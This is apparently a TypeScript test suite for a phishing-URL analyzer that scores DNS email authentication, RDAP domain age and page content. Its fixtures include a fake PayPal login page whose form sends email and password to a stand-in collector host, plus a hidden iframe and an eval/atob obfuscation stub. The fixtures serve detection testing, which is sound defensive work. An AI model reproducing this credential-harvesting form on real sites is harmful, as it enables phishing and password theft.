import { test } from 'node:test';
import assert from 'node:assert/strict';
import { gatherDns, dnsSignals, type DnsResolver } from './dns.ts';
import { rdapLookup, rdapSignals } from './rdap.ts';
import { analyzeContent, contentSignals } from './content.ts';
import { analyzeUrl } from './analyze.ts';
import type { FetchResult } from './fetcher.ts';

// ── DNS ───────────────────────────────────────────────────────────────────────

const fakeDns = (opts: { mx?: string[]; txt?: string[]; dmarc?: string[] }): DnsResolver => ({
  resolveMx: async () => (opts.mx ?? []).map((exchange, i) => ({ exchange, priority: i })),
  resolveNs: async () => ['ns1.example.com'],
  resolveTxt: async (h) => (h.startsWith('_dmarc') ? (opts.dmarc ?? []) : (opts.txt ?? [])).map((t) => [t]),
});

test('gatherDns detects SPF + DMARC presence', async () => {
  const intel = await gatherDns('example.com', fakeDns({ txt: ['v=spf1 include:_spf.google.com ~all'], dmarc: ['v=DMARC1; p=reject'] }));
  assert.equal(intel.hasSpf, true);
  assert.equal(intel.hasDmarc, true);
  assert.equal(intel.dmarcPolicy, 'reject');
});

test('dnsSignals flags missing email auth, weighted up when impersonating a brand', async () => {
  const intel = await gatherDns('paypa1-secure.tk', fakeDns({}));
  const plain = dnsSignals(intel, { isIpHost: false, registrableDomain: 'paypa1-secure.tk', impersonatesBrand: false });
  const brand = dnsSignals(intel, { isIpHost: false, registrableDomain: 'paypa1-secure.tk', impersonatesBrand: true });
  assert.ok(plain.some((s) => s.id === 'dns.no_email_auth'));
  assert.ok(brand[0]!.weight > plain[0]!.weight);
});

// ── RDAP domain age ────────────────────────────────────────────────────────────

const rdapFetch = (json: unknown, status = 200): typeof fetch =>
  (async () => new Response(JSON.stringify(json), { status })) as unknown as typeof fetch;

test('rdapLookup computes domain age from the registration event', async () => {
  const now = () => new Date('2026-01-20T00:00:00Z').getTime();
  const info = await rdapLookup('evil.tk', {
    fetchFn: rdapFetch({ events: [{ eventAction: 'registration', eventDate: '2026-01-12T00:00:00Z' }], status: ['active'] }),
    now,
  });
  assert.equal(info.available, true);
  assert.equal(info.ageDays, 8);
  assert.ok(rdapSignals(info).some((s) => s.id === 'rdap.young_domain' && s.severity === 'high'));
});

test('rdap: an old domain produces no age signal', async () => {
  const now = () => new Date('2026-01-20T00:00:00Z').getTime();
  const info = await rdapLookup('example.com', {
    fetchFn: rdapFetch({ events: [{ eventAction: 'registration', eventDate: '1998-01-01T00:00:00Z' }] }),
    now,
  });
  assert.equal(rdapSignals(info).length, 0);
});

test('rdap: bad registry status is flagged', async () => {
  const info = await rdapLookup('x.tk', { fetchFn: rdapFetch({ status: ['client hold'] }) });
  assert.ok(rdapSignals(info).some((s) => s.id === 'rdap.bad_status'));
});

test('rdap degrades gracefully on network failure', async () => {
  const info = await rdapLookup('x.tk', {
    fetchFn: (async () => {
      throw new Error('ENOTFOUND');
    }) as unknown as typeof fetch,
  });
  assert.equal(info.available, false);
  assert.equal(rdapSignals(info).length, 0);
});

// ── Content analysis ───────────────────────────────────────────────────────────

const PHISH_HTML = `<!doctype html><html><head><title>PayPal - Log In</title></head>
<body><h1>Sign in to your paypal account</h1>
<form action="https://evil-collector.tk/steal.php" method="post">
<input type="text" name="email"><input type="password" name="pw"><button>Log In</button></form>
<iframe src="https://x.tk/t" style="display:none"></iframe>
<script>eval(atob("ZG9jdW1lbnQ="))</script></body></html>`;

test('analyzeContent detects password field, cross-domain form, brand, hidden iframe, obfuscation', () => {
  const c = analyzeContent(PHISH_HTML, 'http://secure-login.tk/');
  assert.equal(c.hasPasswordField, true);
  assert.equal(c.crossDomainForm, 'https://evil-collector.tk/steal.php');
  assert.ok(c.brandsInContent.includes('paypal'));
  assert.equal(c.hiddenIframes, 1);
  assert.ok(c.obfuscation.length >= 1);
});

test('analyzeContent handles unquoted form actions', () => {
  const html = '<form action=https://evil.example/collect method=post><input type=password></form>';
  const c = analyzeContent(html, 'https://login.example/');
  assert.equal(c.crossDomainForm, 'https://evil.example/collect');
});

test('contentSignals raises a critical for cross-domain credential exfiltration', () => {
  const c = analyzeContent(PHISH_HTML, 'http://secure-login.tk/');
  const sigs = contentSignals(c, { registrableDomain: 'secure-login.tk' });
  assert.ok(sigs.some((s) => s.id === 'content.cross_domain_credential_form' && s.severity === 'critical'));
  assert.ok(sigs.some((s) => s.id === 'content.brand_impersonation'));
});

test('benign page produces no content risk signals', () => {
  const html = '<!doctype html><html><head><title>My Blog</title></head><body><p>Hello world, welcome to my blog.</p></body></html>';
  const c = analyzeContent(html, 'https://myblog.example/');
  assert.deepEqual(contentSignals(c, { registrableDomain: 'myblog.example' }), []);
});

// ── Integration ────────────────────────────────────────────────────────────────

test('analyzeUrl fuses content + rdap into a decisive malicious verdict', async () => {
  const fetchImpl = (async () =>
    ({
      ok: true,
      finalUrl: 'http://secure-login.tk/',
      redirects: [],
      bytes: PHISH_HTML.length,
      resolvedIps: ['185.1.2.3'],
      status: 200,
      contentType: 'text/html',
      bodyText: PHISH_HTML,
    }) as FetchResult) as typeof import('./fetcher.ts').safeFetch;

  const report = await analyzeUrl(
    'http://secure-login.tk/',
    { fetch: true },
    {
      fetchImpl,
      dnsResolver: fakeDns({}),
      rdapFetch: rdapFetch({ events: [{ eventAction: 'registration', eventDate: '2026-01-12T00:00:00Z' }] }),
      now: () => new Date('2026-01-20T00:00:00Z'),
      idGen: () => 'enrich-test',
      config: { reputationTimeoutMs: 500, fetchTimeoutMs: 500, maxFetchBytes: 1_000_000 },
    },
  );
  assert.equal(report.verdict, 'malicious');
  assert.ok(report.signals.some((s) => s.id === 'content.cross_domain_credential_form'));
  assert.ok(report.signals.some((s) => s.id === 'rdap.young_domain'));
  assert.equal(report.detail.kind, 'url');
  if (report.detail.kind === 'url') {
    assert.ok(report.detail.content?.hasPasswordField);
    assert.equal(report.detail.rdap?.ageDays, 8);
  }
});
